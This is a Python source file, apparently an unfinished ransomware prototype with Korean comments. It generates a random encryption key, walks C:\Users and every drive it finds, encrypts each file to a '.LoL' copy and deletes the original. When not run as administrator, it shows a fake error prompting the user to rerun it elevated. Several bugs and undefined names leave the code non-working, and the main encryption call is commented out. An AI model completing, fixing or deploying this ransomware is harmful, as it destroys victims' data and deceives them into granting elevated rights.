import ctypes
import threading, pathlib, nacl.utils, tkinter
import os, sys, nacl.secret
from PIL import Image, ImageDraw, ImageFont
from time import sleep


class Encryptor():
    def __init__(self, files=0, encryptModule=0):
        self._files=files
        self._encryptModule=encryptModule

    def encryptFile():
        try:
            for file in self._files:
                if(os.path.isdir(file)!=True):#파일이라면
                    if(file!=sys.argv[0]):#현재의 파이썬 스크립트를 암호화하려하면 종료
                        return
                
                    with open(file, "rb") as File:
                        data=File.read()
                    encryptedFile=self._encryptModule.encrypt(data)
                    with open(f"{file}.LoL", "wb") as File:
                        File.write(encryptedFile)
                    os.remove(file)
                
        except Exception as e:
            print(f"[DEBUG] Error on encrypt.encryptFile(): {e}")

Key=nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
EncryptModule=nacl.secret.SecretBox(Key)
MaxThread=120
IsAdmin=ctypes.windll.shell32.IsUserAnAdmin()

PathList=[r"C:\Users\\"]
for letter in range(97, 123):
    drive=f"{chr(letter)}:\\"
    if (pathlib.Path(drive).exists()):#존재하는 드라이브명 ex F:\\이면 추가
        PathList.append(drive)
PathList.remove("c:\\")

print(f"[DEBUG] Key: {Key}")
print(f"[DEBUG] PathList: {PathList}")

def changeBackground():
    pass

def recursiveEncrypt(dir):#객체를 언제 생성할 것인가? 1. 매 파일마다 객체 생성? 디렉토리별로 객체생성? 드라이브별로 객체생성? 스레드 내부에서 객체생성?
    if(pathlib.Path(dir).exists!=True):#존재하는 경로인지 확
        return
    for path, dirs, files in os.walk(dir):
        if(files.len()>0):
            Encryptor(files, EncryptModule).encryptFile(files)#파일을 우선적으로 인코딩하고_디렉별로 객체생성
        if(dirs.len()>0):
            recursiveEncrypt(dir)#하부의 디렉토리는 재귀적으로 실행_스레드를 도입하려면 FileSize를 계산해야할

def fakeAlert():
    WINDOW=tkinter.TK()
    WINDOW.withdraw()
    messagebox.showerror("Error", "Try to re-run as administrator")

if __name__ == '__main__':
    if(isAdmin):
        changeBackground()
        for drive in  pathList:#드라이브 별로 스레드작업? 안정성을 위해 작업하다가 exception발생한 경우 복구하는 것도 중요. 다만 지금코드는 마지막에 원본삭제.
            #recursiveEncrypt(drive)
            print("타겟 드라이브: "+drive)
            
            
    else:
        fakeAlert()
            
                          
                      
